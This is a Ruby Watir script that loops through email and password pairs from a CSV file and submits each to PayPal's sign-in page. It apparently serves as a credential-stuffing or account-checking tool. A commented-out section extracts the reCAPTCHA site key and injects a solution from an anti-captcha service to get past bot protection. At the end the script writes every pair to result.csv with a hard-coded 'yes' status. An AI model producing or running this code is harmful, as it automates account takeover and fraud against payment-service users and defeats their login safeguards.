require './anti_captcha'
require 'watir'
require 'csv'

WEB_URL = "https://www.paypal.com/signin"
SHORT_TIME_DELAY = 2
file_path = 'data.csv'
count = 0


## import data from csv
list_email = Array.new
list_password = Array.new

CSV.foreach(file_path) do |row|
    list_email << row[0]
    list_password << row[1]
end

count = list_email.length() - 1


## application
begin

    for i in 0..count
        puts ".... at "
        browser = Watir::Browser.new:chrome
    
        puts "....open "
        browser.goto(WEB_URL)
        
        sleep(SHORT_TIME_DELAY)
    
        puts "write email "
        browser.text_field(id: 'email').set(list_email[i])
    
        puts "click next login "
        browser.button(text: 'Next').click
        
        sleep(SHORT_TIME_DELAY)
    
        puts "write password "
        browser.text_field(id: 'password').set(list_password[i])
        




        puts "click next password"
        browser.button(text: 'Log In').click

        # unless browser.text_field(id: 'recaptcha-token').nil?
        #     sleep(50)

        # end


        puts "-----check iframe"
        # if browser.form(action: '/auth/validatecaptcha').exists?
        #   WEB_CAPTCHA_URL = "https://www.paypal.com/signin"
        #   # get website key
        #   iframe_captcha = browser.iframe(name: 'recaptcha')
        #   src_captcha = iframe_captcha.attribute_value('src')
        #   params = CGI.parse(URI.parse(src_captcha).query)
        #   website_key = params['siteKey'][0]
      
        #   puts 'website_key'
        #   puts website_key
      
        #   # anti captcha
        #   solution = AntiCaptcha.google_recaptcha(WEB_CAPTCHA_URL, website_key)
      
        #   # set captcha response
      
        #   # task
        #   textarea = iframe_captcha.textarea(id: 'g-recaptcha-response')
        #   sleep(30)
        #   puts "codee "
        #   browser.execute_script("return arguments[0].innerHTML = '#{solution['gRecaptchaResponse']}';", textarea) unless solution.nil?
        #   sleep(60)
        #   puts "submit"
        #   browser.form(action: '/auth/validatecaptcha').submit
        #   puts "done"
        #   sleep(60)

        # else
        #   # browser.a(text: 'Not now').click
        #   # <a href="https://www.paypal.com/myaccount/summary" class="scTrack:not-now" pa-marked="1">Not now</a>
        # end


        puts '------------------------------------------'
        puts "....finish "
        sleep(SHORT_TIME_DELAY)
        browser.close
    end

    CSV.open("result.csv", "wb") do |csv|
      csv << ["user", "password", "status"]
      for i in 0..count
        csv << [list_email[i], list_password[i], "yes"]
      end
    end

end

